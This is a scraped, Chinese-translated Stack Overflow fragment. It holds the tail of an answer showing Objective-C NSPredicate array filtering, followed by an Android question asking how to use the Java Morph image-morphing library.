> 时间：2013-04-06T06:58:08.893

采用`NSPredicate`

```
NSArray *filtered = [yourArray filteredArrayUsingPredicate:[NSPredicate predicateWithFormat:@"(Cate LIKE[CD] %@)", @"subcat"]]; 
```

# android - 如何在android中集成java morph库？

> ID：15847998
> 
> 赞同：2
> 
> 时间：2013-04-06T06:52:09.587
> 
> 标签：android, image-processing

我想开发像这个[链接的android应用程序](https://stackoverflow.com/questions/15779669/how-to-morphing-on-image-in-android)

但是如何在android中集成java morph库..

如果您有任何示例链接，请将其粘贴在这里..

[Java 变形库](https://code.google.com/p/javamorph/)

提前致谢